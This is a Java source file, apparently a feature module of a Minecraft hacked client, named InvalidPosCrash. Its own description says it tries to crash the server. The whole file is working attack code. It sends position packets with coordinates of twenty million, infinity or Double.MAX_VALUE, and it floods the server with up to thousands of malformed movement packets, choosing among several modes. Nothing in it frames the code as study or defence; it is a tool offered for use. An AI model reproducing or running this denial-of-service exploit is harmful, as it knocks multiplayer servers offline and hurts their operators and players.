package me.dustin.crash.feature;

import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventMove;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

@Feature.Manifest(category = Feature.Category.MISC, description = "Attempts to crash the server by sending invalid position packets. (may freeze or kick you)")
public class InvalidPosCrash extends Feature {

    @Op(name = "Mode", all = {"Twenty Million", "Infinity", "TP", "Velt", "Switch"})
    public String mode = "Twenty Million";
    @Op(name = "Packet Count", min = 1, max = 10000, inc = 10)
    public int packetCount = 500;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    private boolean switchBl = false;
    public InvalidPosCrash() {
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @Override
    public void onEnable() {
        if (Wrapper.INSTANCE.getWorld() != null && Wrapper.INSTANCE.getLocalPlayer() != null) {
            switch(mode.toLowerCase()) {
                case "twenty million" -> {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(20000000, 255, 20000000, true));
                    setState(false);
                }
                case "infinity" -> {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                    setState(false);
                }
                case "tp" -> {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }
            }
        }
        super.onEnable();
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        switch (mode.toLowerCase()) {
            case "tp" -> {
                for (double i = 0; i < packetCount; i++) {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Wrapper.INSTANCE.getLocalPlayer().getY() + (i * 9), Wrapper.INSTANCE.getLocalPlayer().getZ(), true));
                }
                for (double i = 0; i < packetCount * 10; i++) {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Wrapper.INSTANCE.getLocalPlayer().getY() + (i * packetCount), Wrapper.INSTANCE.getLocalPlayer().getZ() + (i * 9), true));
                }
            }
            case "velt" -> {
                if (Wrapper.INSTANCE.getLocalPlayer().age < 100) {
                    for (int i = 0; i < packetCount; i++) {
                        NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Wrapper.INSTANCE.getLocalPlayer().getY() - 1.0D, Wrapper.INSTANCE.getLocalPlayer().getZ(), false));
                        NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Double.MAX_VALUE, Wrapper.INSTANCE.getLocalPlayer().getZ(), false));
                        NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Wrapper.INSTANCE.getLocalPlayer().getY() - 1.0D, Wrapper.INSTANCE.getLocalPlayer().getZ(), false));
                    }
                }
            }
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));

    @EventPointer
    private final EventListener<EventMove> eventMoveEventListener = new EventListener<>(eventMove -> {
       if (mode.equalsIgnoreCase("Switch")) {
           if (switchBl) {
               eventMove.setX(Double.MIN_VALUE);
               eventMove.setZ(Double.MIN_VALUE);
               switchBl = false;
           }
           else {
               eventMove.setX(Double.MAX_VALUE);
               eventMove.setZ(Double.MAX_VALUE);
               switchBl = true;
           }
       }
    });

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));
}